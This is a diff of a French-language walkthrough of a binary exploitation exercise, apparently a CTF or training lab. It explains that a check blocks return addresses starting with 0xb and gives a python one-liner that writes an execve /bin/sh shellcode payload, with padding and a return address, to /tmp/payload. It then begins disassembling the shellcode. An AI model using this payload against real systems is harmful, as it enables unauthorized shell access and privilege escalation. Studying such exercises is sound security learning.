@@ -56,6 +56,10 @@ Quand on rentre quoique ce soit, ca le renvoie
    0x0804853d <+105>:	leave  
    0x0804853e <+106>:	ret
 
+Quand on regarde le code, on a pas d'appel à system et une vérification empèche l'envoie d'adresse commencant par 0xb (comme l'adresse de system par exemple)
+
+On va donc utiliser un shellcode afin d'ouvrir un shell avec les droits.
+
 > python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload
 
 6a 0b          push 0xb             (0xb = 11 -> numéro syscall de execve)
